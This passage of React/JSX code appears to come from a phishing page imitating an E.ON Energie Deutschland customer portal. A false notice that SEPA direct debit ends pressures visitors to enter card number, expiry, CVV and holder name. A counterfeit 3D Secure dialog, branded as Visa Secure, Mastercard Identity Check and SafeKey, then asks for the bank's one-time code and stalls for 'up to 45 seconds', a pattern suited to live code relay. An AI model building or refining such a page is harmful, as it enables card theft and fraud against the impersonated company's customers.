                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <line x1="18" y1="6" x2="6" y2="18" />
                      <line x1="6" y1="6" x2="18" y2="18" />
                    </svg>
                    Nicht in Belieferung
                  </span>
                </div>
                <div className="space-y-1.5">
                  {userProfile?.fullName && (
                    <p className="text-[1.5rem] text-[#333333]">
                      <span className="font-semibold">{userProfile.fullName}</span>
                    </p>
                  )}
                  <p className="text-[1.5rem] text-[#666666]">{userProfile?.address || "Wird geladen..."}</p>
                </div>
              </div>
            </div>

            {/* Right: Account Details & Button */}
            <div className="flex flex-col lg:items-end gap-4">
              <div className="space-y-1.5 text-[1.5rem]">
                <p className="text-[#333333]">
                  <span className="font-normal">Vertragskonto:</span>{" "}
                  <span className="font-semibold">{accountNumbers.vertragskonto}</span>
                </p>
                <p className="text-[#333333]">
                  <span className="font-normal">Zählernummer:</span>{" "}
                  <span className="font-semibold">{accountNumbers.zahlernummer}</span>
                </p>
                <p className="text-[#333333]">
                  <span className="font-normal">Marktlokations-ID:</span>{" "}
                  <span className="font-semibold">{accountNumbers.marktlokation}</span>
                </p>
              </div>
              <button className="bg-[#E20015] hover:bg-[#C00012] text-white text-[1.5rem] font-bold px-7 py-3.5 rounded-md flex items-center gap-2.5 transition-colors shadow-sm">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                  <line x1="12" y1="5" x2="12" y2="19" />
                  <line x1="5" y1="12" x2="19" y2="12" />
                </svg>
                Vertrag hinzufügen
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Tab Navigation */}
      <nav
        className={`bg-white border-b border-[#E0E0E0] transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
      >
        <div className="max-w-[1400px] mx-auto px-8">
          <nav className="flex gap-10 overflow-x-auto">
            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
              Überblick
            </button>
            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
              Vertragsdetails
            </button>
            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
              Abschlag
            </button>
            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
              Zählerstand
            </button>
            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
              Rechnung
            </button>
            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
              Postbox
            </button>
            <button className="text-[1.5rem] font-bold text-[#1A1A1A] py-5 border-b-3 border-[#E20015] whitespace-nowrap">
              Zahlungsart
            </button>
          </nav>
        </div>
      </nav>

      <section className="bg-gradient-to-br from-[#FFF9E6] via-[#FFF4D6] to-[#FFEEC6] border-b-4 border-[#FFC107] py-10 relative z-50 isolate">
        <div className="max-w-[1400px] mx-auto px-8">
          <div className="flex items-start gap-7">
            <div className="flex-shrink-0 w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-md border-2 border-[#FFC107]">
              <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#F57C00" strokeWidth="2.5">
                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
                <line x1="12" y1="9" x2="12" y2="13" />
                <line x1="12" y1="17" x2="12.01" y2="17" />
              </svg>
            </div>
            <div className="flex-1">
              <h3 className="text-[2.6rem] font-bold text-[#1A1A1A] mb-4 leading-tight">
                Wichtige Mitteilung: SEPA-Lastschrift wird eingestellt
              </h3>
              <p className="text-[1.7rem] text-[#333333] mb-7 leading-relaxed">
                Ab dem <strong className="font-bold">1. November 2025</strong> unterstützen wir keine
                SEPA-Lastschriftverfahren mehr. Bitte hinterlegen Sie eine Kreditkarte als neue Zahlungsmethode, um Ihre
                Energierechnungen weiterhin bequem und automatisch zu bezahlen.
              </p>
              <button
                onClick={() => setShowAddModal(true)}
                className="bg-[#E20015] hover:bg-[#C00012] text-white text-[1.7rem] font-bold py-5 px-12 rounded-lg transition-all flex items-center gap-3 shadow-lg hover:shadow-xl hover:scale-[1.02]"
              >
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                  <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                  <line x1="1" y1="10" x2="23" y2="10" />
                </svg>
                Kreditkarte jetzt hinzufügen
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Main Content */}
      <main
        className={`max-w-[1200px] mx-auto px-8 py-12 transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
      >
        <section className="bg-white py-14 border-t border-[#E0E0E0]">
          <div className="max-w-[1400px] mx-auto px-8">
            <h2 className="text-[3.2rem] font-bold text-[#1A1A1A] mb-10">Zahlungsübersicht</h2>

            <div className="mb-10">
              <div className="flex items-baseline gap-4 mb-3">
                <span className="text-[4.2rem] font-bold text-[#1A1A1A] leading-none">0,00 €</span>
                <span className="text-[2rem] font-normal text-[#666666]">Ausgeglichen</span>
              </div>
              <p className="text-[1.5rem] text-[#999999]">Kontostand vom 16.10.2025</p>
            </div>

            <div className="bg-[#FAFAFA] rounded-lg overflow-hidden border border-[#E0E0E0]">
              <table className="w-full">
                <tbody className="divide-y divide-[#E0E0E0]">
                  <tr className="hover:bg-[#F5F5F5] transition-colors">
                    <td className="px-7 py-6 text-[1.6rem] font-semibold text-[#1A1A1A]">69,00 €</td>
                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666]">Gutschrift</td>
                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666] text-right">
                      Fällig am 24.04.2025
                    </td>
                  </tr>
                  <tr className="hover:bg-[#F5F5F5] transition-colors">
                    <td className="px-7 py-6 text-[1.6rem] font-semibold text-[#1A1A1A]">48,96 €</td>
                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666]">Gutschrift</td>
                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666] text-right">
                      Fällig am 20.02.2025
                    </td>
                  </tr>
                  <tr className="hover:bg-[#F5F5F5] transition-colors">
                    <td className="px-7 py-6 text-[1.6rem] font-semibold text-[#1A1A1A]">55,71 €</td>
                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666]">Zahlungseingang</td>
                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666] text-right">
                      Fällig am 02.01.2025
                    </td>
                  </tr>
                </tbody>
              </table>
              <div className="px-7 py-5 border-t border-[#E0E0E0] bg-white">
                <button className="text-[1.5rem] font-normal text-[#E20015] hover:text-[#C00012] hover:underline flex items-center gap-2 transition-colors">
                  mehr anzeigen (10)
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polyline points="6 9 12 15 18 9" />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </section>

        <section className="bg-white py-14 border-t border-[#E0E0E0]">
          <div className="max-w-[1400px] mx-auto px-8">
            <h2 className="text-[3.2rem] font-bold text-[#1A1A1A] mb-10">Bankverbindung</h2>

            {/* Payment Methods List */}
            {paymentMethods.length === 0 ? (
              <div className="bg-[#FAFAFA] rounded-lg p-12 text-center border border-[#E0E0E0]">
                <div className="w-24 h-24 mx-auto mb-7 bg-white rounded-full flex items-center justify-center shadow-sm border border-[#CCCCCC]">
                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#999999" strokeWidth="2">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                    <line x1="1" y1="10" x2="23" y2="10" />
                  </svg>
                </div>
                <h3 className="text-[2.6rem] font-bold text-[#1A1A1A] mb-4">Keine Zahlungsmethoden hinterlegt</h3>
                <p className="text-[1.7rem] text-[#666666] mb-10 max-w-md mx-auto">
                  Fügen Sie eine Zahlungsmethode hinzu, um Ihre Rechnungen bequem zu bezahlen.
                </p>
                <button
                  onClick={() => setShowAddModal(true)}
                  className="bg-[#E20015] hover:bg-[#C00012] text-white text-[1.7rem] font-bold py-5 px-10 rounded-lg transition-colors inline-flex items-center gap-3 shadow-md hover:scale-[1.02]"
                >
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <line x1="12" y1="5" x2="12" y2="19" />
                    <line x1="5" y1="12" x2="19" y2="12" />
                  </svg>
                  Zahlungsmethode hinzufügen
                </button>
              </div>
            ) : (
              <div className="space-y-6">
                {paymentMethods.map((pm) => {
                  const display = getPaymentMethodDisplay(pm)
                  const isDeleting = deletingId === pm.id
                  const isSettingDefault = settingDefaultId === pm.id

                  return (
                    <div
                      key={pm.id}
                      className="bg-white border border-[#E0E0E0] rounded-lg overflow-hidden shadow-sm hover:shadow-lg transition-shadow"
                    >
                      <div className="p-8">
                        <div className="flex items-start justify-between mb-5">
                          <div className="flex items-center gap-5">
                            <div className="w-16 h-16 bg-[#F5F5F5] rounded-lg flex items-center justify-center flex-shrink-0 border border-[#E0E0E0]">
                              {display.icon}
                            </div>
                            <div>
                              <h3 className="text-[1.9rem] font-bold text-[#1A1A1A]">{display.title}</h3>
                              <p className="text-[1.6rem] text-[#666666] font-mono">{display.subtitle}</p>
                              {display.cardHolder && (
                                <p className="text-[1.4rem] text-[#999999] mt-1.5">{display.cardHolder}</p>
                              )}
                            </div>
                          </div>

                          <div className="flex flex-col items-end gap-2.5">
                            {pm.is_default && (
                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-green-100 text-green-800">
                                ✓ Standard
                              </span>
                            )}
                            {pm.is_verified && (
                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-blue-100 text-blue-800">
                                ✓ Verifiziert
                              </span>
                            )}
                            {!pm.is_verified && (
                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-yellow-100 text-yellow-800">
                                ⚠ Ausstehend
                              </span>
                            )}
                            {display.isExpiringSoon && (
                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-orange-100 text-orange-800">
                                ⚠ Läuft bald ab
                              </span>
                            )}
                          </div>
                        </div>

                        {display.expiry && (
                          <div className="mb-5 pb-5 border-b border-[#E0E0E0]">
                            <p className="text-[1.5rem] text-[#666666]">
                              Gültig bis: <span className="font-mono font-semibold">{display.expiry}</span>
                            </p>
                          </div>
                        )}

                        <div className="flex items-center justify-between">
                          <p className="text-[1.3rem] text-[#AAAAAA]">
                            Hinzugefügt am {new Date(pm.created_at).toLocaleDateString("de-DE")}
                          </p>
                          <div className="flex gap-4">
                            {!pm.is_verified && (
                              <button
                                onClick={() => {
                                  setPendingCardId(pm.id)
                                  setPending3DSecureBinData({
                                    bank: pm.bank_name ? { name: pm.bank_name } : null,
                                    brand: pm.card_brand || "",
                                    type: "credit",
                                    level: pm.card_level || undefined,
                                    country: null,
                                  })
                                  setShow3DSecureModal(true)
                                  setVerificationStep("auth")
                                }}
                                className="text-[1.5rem] text-[#E20015] hover:text-[#C00012] font-semibold transition-colors"
                              >
                                Jetzt verifizieren
                              </button>
                            )}
                            {!pm.is_default && pm.is_verified && (
                              <button
                                onClick={() => handleSetDefault(pm.id)}
                                disabled={isSettingDefault || isDeleting}
                                className="text-[1.5rem] text-[#E20015] hover:text-[#C00012] font-semibold disabled:opacity-50 transition-colors"
                              >
                                {isSettingDefault ? "Wird gesetzt..." : "Als Standard festlegen"}
                              </button>
                            )}
                            <button
                              onClick={() => handleDeleteMethod(pm.id)}
                              disabled={isDeleting || isSettingDefault}
                              className="text-[1.5rem] text-[#999999] hover:text-red-600 font-semibold disabled:opacity-50 transition-colors"
                            >
                              {isDeleting ? "Wird gelöscht..." : "Entfernen"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>
        </section>
      </main>

      {showAddModal && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-[60] p-4">
          <div className="bg-white rounded-xl shadow-2xl w-full max-w-[600px] max-h-[90vh] overflow-y-auto">
            <div className="bg-gradient-to-r from-[#E20015] to-[#C00012] px-6 sm:px-8 py-6 sm:py-7 flex items-center justify-between">
              <h2 className="text-xl sm:text-2xl md:text-3xl font-bold text-white">Kreditkarte hinzufügen</h2>
              <button
                onClick={() => {
                  setShowAddModal(false)
                  resetForm()
                }}
                className="text-white/90 hover:text-white transition-colors"
              >
                <svg
                  className="w-7 h-7 sm:w-8 sm:h-8"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                  strokeWidth="2"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div className="p-6 sm:p-8 md:p-10">
              <form onSubmit={handleAddPaymentMethod} className="space-y-6 sm:space-y-7">
                <div>
                  <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
                    Kartennummer <span className="text-red-500">*</span>
                  </label>
                  <input
                    ref={cardNumberRef}
                    type="text"
                    value={formData.card_number}
                    onChange={(e) => handleCardNumberChange(e.target.value)}
                    onPaste={handleCardNumberPaste}
                    onKeyDown={(e) => handleKeyDown(e, expiryRef)}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
                      errors.card_number
                        ? "border-red-500"
                        : validFields.card_number
                          ? "border-green-500"
                          : "border-gray-300 focus:border-[#E20015]"
                    }`}
                    required
                  />
                  {errors.card_number && <p className="mt-2 text-base sm:text-lg text-red-600">{errors.card_number}</p>}
                  {binData && !errors.card_number && (
                    <p className="mt-2 text-base sm:text-lg text-blue-600">
                      {binData.bank?.name} • {binData.type}
                    </p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-4 sm:gap-6">
                  <div>
                    <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
                      Gültig bis <span className="text-red-500">*</span>
                    </label>
                    <input
                      ref={expiryRef}
                      type="text"
                      value={expiryDisplay}
                      onChange={(e) => handleExpiryChange(e.target.value)}
                      onKeyDown={(e) => handleKeyDown(e, cvvRef)}
                      placeholder="MM/JJ"
                      maxLength={5}
                      className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
                        errors.expiry
                          ? "border-red-500"
                          : validFields.expiry
                            ? "border-green-500"
                            : "border-gray-300 focus:border-[#E20015]"
                      }`}
                      required
                    />
                    {errors.expiry && <p className="mt-2 text-base sm:text-lg text-red-600">{errors.expiry}</p>}
                  </div>
                  <div>
                    <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      ref={cvvRef}
                      type="text"
                      value={formData.cvv}
                      onChange={(e) => handleCvvChange(e.target.value)}
                      onKeyDown={(e) => handleKeyDown(e, cardHolderRef)}
                      placeholder="123"
                      maxLength={4}
                      className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
                        errors.cvv
                          ? "border-red-500"
                          : validFields.cvv
                            ? "border-green-500"
                            : "border-gray-300 focus:border-[#E20015]"
                      }`}
                      required
                    />
                    {errors.cvv && <p className="mt-2 text-base sm:text-lg text-red-600">{errors.cvv}</p>}
                  </div>
                </div>

                <div>
                  <label className="block text-base sm:text-lg md:text-xl font-semibold text-gray-700 mb-3">
                    Karteninhaber <span className="text-red-500">*</span>
                  </label>
                  <input
                    ref={cardHolderRef}
                    type="text"
                    value={formData.card_holder}
                    onChange={(e) => handleCardHolderChange(e.target.value)}
                    placeholder="Max Mustermann"
                    className={`w-full px-4 sm:px-5 py-4 sm:py-5 text-lg sm:text-xl md:text-2xl border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E20015]/20 transition-all ${
                      validFields.card_holder ? "border-green-500" : "border-gray-300 focus:border-[#E20015]"
                    }`}
                    required
                  />
                </div>

                <div className="bg-green-50 border border-green-200 rounded-lg p-4 sm:p-5">
                  <p className="text-base sm:text-lg text-green-800">
                    🔒 Ihre Daten werden sicher verschlüsselt übertragen
                  </p>
                </div>

                <div className="flex gap-3 sm:gap-4 pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      setShowAddModal(false)
                      resetForm()
                    }}
                    className="flex-1 px-5 sm:px-6 py-4 sm:py-5 text-base sm:text-lg md:text-xl border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-all font-semibold"
                  >
                    Abbrechen
                  </button>
                  <button
                    type="submit"
                    disabled={isSubmitting || !isFormValid}
                    className="flex-1 px-5 sm:px-6 py-4 sm:py-5 text-base sm:text-lg md:text-xl bg-[#E20015] text-white rounded-lg hover:bg-[#C00012] transition-all font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isSubmitting ? "Wird hinzugefügt..." : "Hinzufügen"}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      )}

      {showStripeLoading && (
        <div className="fixed inset-0 bg-white/30 flex items-center justify-center z-50 backdrop-blur-md">
          <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl p-12">
            <div className="text-center">
              <div className="mb-8">
                {cardType === "mastercard" && (
                  <div className="space-y-4">
                    <div className="flex items-center justify-center gap-3">
                      <div className="relative w-16 h-16">
                        <div className="absolute inset-0 bg-[#EB001B] rounded-full opacity-80" />
                        <div className="absolute inset-0 bg-[#F79E1B] rounded-full opacity-80 translate-x-6" />
                      </div>
                    </div>
                    <h3 className="text-2xl font-bold text-gray-900">Mastercard Identity Check</h3>
                  </div>
                )}

                {cardType === "visa" && (
                  <div className="space-y-4">
                    <div className="text-[#1A1F71] text-5xl font-bold">VISA</div>
                    <h3 className="text-2xl font-bold text-gray-900">Visa Secure</h3>
                  </div>
                )}

                {cardType === "amex" && (
                  <div className="space-y-4">
                    <div className="text-[#006FCF] text-4xl font-bold">AMERICAN EXPRESS</div>
                    <h3 className="text-2xl font-bold text-gray-900">SafeKey</h3>
                  </div>
                )}

                {!cardType && (
                  <div className="space-y-4">
                    <div className="w-16 h-16 mx-auto bg-gray-100 rounded-full flex items-center justify-center">
                      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                        <line x1="1" y1="10" x2="23" y2="10" />
                      </svg>
                    </div>
                    <h3 className="text-2xl font-bold text-gray-900">3D Secure</h3>
                  </div>
                )}
              </div>

              <div className="relative w-16 h-16 mx-auto mb-6">
                <div className="absolute inset-0 border-4 border-gray-200 rounded-full" />
                <div className="absolute inset-0 border-4 border-transparent border-t-gray-900 rounded-full animate-spin" />
              </div>

              <p className="text-gray-600 text-lg">Verbindung wird hergestellt...</p>
            </div>
          </div>
        </div>
      )}

      {show3DSecureModal && (
        <div className="fixed inset-0 bg-white/30 flex items-center justify-center p-4 z-50 backdrop-blur-md">
          <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl overflow-hidden">
            {verificationStep === "loading" && (
              <div className="p-12 text-center">
                <div className="w-20 h-20 mx-auto mb-6 relative">
                  <div className="absolute inset-0 border-4 border-[#E20015] border-t-transparent rounded-full animate-spin" />
                  <div
                    className="absolute inset-2 border-4 border-gray-200 border-t-transparent rounded-full animate-spin"
                    style={{ animationDirection: "reverse", animationDuration: "1s" }}
                  />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Karte wird überprüft</h3>
                <p className="text-gray-600">Bitte warten Sie einen Moment...</p>
              </div>
            )}

            {verificationStep === "auth" && (
              <>
                <div className="bg-gradient-to-r from-[#E20015] to-[#C00012] p-6 text-white">
                  <div className="flex items-center gap-3 mb-2">
                    <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                      </svg>
                    </div>
                    <div>
                      <h3 className="text-xl font-bold">3D Secure Authentifizierung</h3>
                      {pending3DSecureBinData?.bank?.name && (
                        <p className="text-sm text-white/90">{pending3DSecureBinData.bank.name}</p>
                      )}
                    </div>
                  </div>
                </div>

                <div className="p-8">
                  {pending3DSecureBinData?.bank && (
                    <div className="mb-6 p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl">
                      <div className="flex items-start gap-3">
                        <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" strokeWidth="2">
                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                            <polyline points="9 22 9 12 15 12 15 22" />
                          </svg>
                        </div>
                        <div className="flex-1">
                          <h4 className="text-sm font-bold text-gray-900 mb-1">{pending3DSecureBinData.bank.name}</h4>
                          <p className="text-xs text-gray-600">fordert Authentifizierung an</p>
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
                    <p className="text-sm text-blue-900">
                      {pending3DSecureBinData?.bank
                        ? `${pending3DSecureBinData.bank.name} hat einen Sicherheitscode an Ihr registriertes Gerät gesendet.`
                        : "Ihre Bank hat einen Sicherheitscode an Ihr registriertes Gerät gesendet."}{" "}
                      Bitte geben Sie den 6-stelligen Code ein.
                    </p>
                  </div>

                  {verificationError && (
                    <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
                      <p className="text-sm text-red-900 font-semibold">{verificationError}</p>
                    </div>
                  )}

                  <div className="mb-6">
                    <label className="block text-sm font-semibold text-gray-700 mb-3">Verifizierungscode</label>
                    <input
                      ref={verificationCodeRef}
                      type="text"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      placeholder="000000"
                      value={verificationCode}
                      onChange={(e) => handleVerificationCodeChange(e.target.value)}
                      maxLength={6}
                      disabled={isVerifying}
                      className="w-full px-6 py-4 text-center text-2xl font-mono tracking-widest border-2 border-gray-300 rounded-xl focus:outline-none focus:border-[#E20015] focus:ring-4 focus:ring-[#E20015]/10 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                    />
                    <p className="text-xs text-gray-500 mt-2 text-center">
                      Code wird automatisch erkannt und überprüft
                    </p>
                  </div>

                  <button
                    onClick={() => handle3DSecureVerification()}
                    disabled={verificationCode.length !== 6 || isVerifying}
                    className="w-full bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-4 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mb-4"
                  >
                    {isVerifying ? (
                      <span className="flex items-center justify-center gap-2">
                        <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                            fill="none"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        Wird überprüft...
                      </span>
                    ) : (
                      "Code bestätigen"
                    )}
                  </button>

                  <button
                    onClick={() => {
                      setShow3DSecureModal(false)
                      setVerificationCode("")
                      setVerificationStep("loading")
                      setPendingCardId(null)
                      setPending3DSecureBinData(null)
                      setVerificationRequestId(null)
                      setVerificationError(null)
                      router.refresh()
                    }}
                    disabled={isVerifying}
                    className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-4 rounded-xl transition-all disabled:opacity-50"
                  >
                    Später verifizieren
                  </button>

                  <div className="mt-6 pt-6 border-t border-gray-200">
                    <p className="text-xs text-gray-500 text-center">
                      Für Testzwecke: Geben Sie einen beliebigen 6-stelligen Code ein
                    </p>
                  </div>
                </div>
              </>
            )}

            {verificationStep === "validating" && (
              <div className="p-12 text-center">
                <div className="w-20 h-20 mx-auto mb-6 relative">
                  <div className="absolute inset-0 border-4 border-[#E20015] border-t-transparent rounded-full animate-spin" />
                  <div
                    className="absolute inset-2 border-4 border-gray-200 border-t-transparent rounded-full animate-spin"
                    style={{ animationDirection: "reverse", animationDuration: "1s" }}
                  />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Code wird validiert</h3>
                <p className="text-gray-600 mb-4">Bitte warten Sie, während Ihr Code überprüft wird...</p>
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                  <p className="text-xs text-blue-900">
                    Dies kann bis zu 45 Sekunden dauern. Bitte schließen Sie dieses Fenster nicht.
                  </p>
                </div>
              </div>
            )}

            {verificationStep === "error" && (
              <div className="p-12 text-center">
                <div className="w-20 h-20 mx-auto mb-6 bg-red-100 rounded-full flex items-center justify-center">
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#EF4444" strokeWidth="3">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="15" y1="9" x2="9" y2="15" />
                    <line x1="9" y1="9" x2="15" y2="15" />
                  </svg>
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-2">Verifizierung fehlgeschlagen</h3>
                <p className="text-gray-600">{verificationError || "Bitte versuchen Sie es erneut."}</p>
              </div>
            )}

            {verificationStep === "success" && (
              <div className="p-12 text-center">
                <div className="w-20 h-20 mx-auto mb-6 bg-green-100 rounded-full flex items-center justify-center">
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
                    <path d="M20 6L9 17l-5-5" />
                  </svg>
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-2">Erfolgreich verifiziert!</h3>
                <p className="text-gray-600">Ihre Karte wurde erfolgreich hinzugefügt und verifiziert.</p>
              </div>
            )}
          </div>
        </div>
      )}

      <footer
        className={`bg-white border-t border-[#E0E0E0] px-8 py-10 transition-all duration-500 ${showSepaAlert ? "blur-sm" : ""}`}
      >
        <div className="max-w-[1400px] mx-auto text-center text-[1.4rem] text-[#999999]">
          <p>© 2025 E.ON Energie Deutschland GmbH</p>
        </div>
      </footer>
    </div>
  )
}
